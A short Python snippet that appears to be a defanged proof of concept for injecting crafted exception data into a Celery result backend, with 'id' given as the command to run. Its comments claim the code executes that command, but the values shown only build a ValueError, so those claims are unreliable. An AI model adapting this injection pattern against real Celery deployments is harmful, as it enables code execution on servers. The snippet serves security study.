from celery import Celery

app = Celery('tasks', broker='pyamqp://guest@localhost//', backend='rpc://')

@app.task
def example_task():
    return "This is a task."

# Simulating an attacker manipulating the backend
# This is a hypothetical example of how an attacker could inject malicious data
malicious_data = {
    'result': 'malicious_command',
    'exc_module': 'builtins',  # Change to 'builtins' to prevent os import
    'exc_type': 'ValueError',  # Change to ValueError to prevent system call
    'exc_message': 'id'  # This could be a command to execute
}


# This would lead to execution of the injected command
try:
    result = app.backend.exception_to_python(malicious_data)
    print(result)  # This could execute 'id' command
except Exception as e:
    print(f"Error: {e}")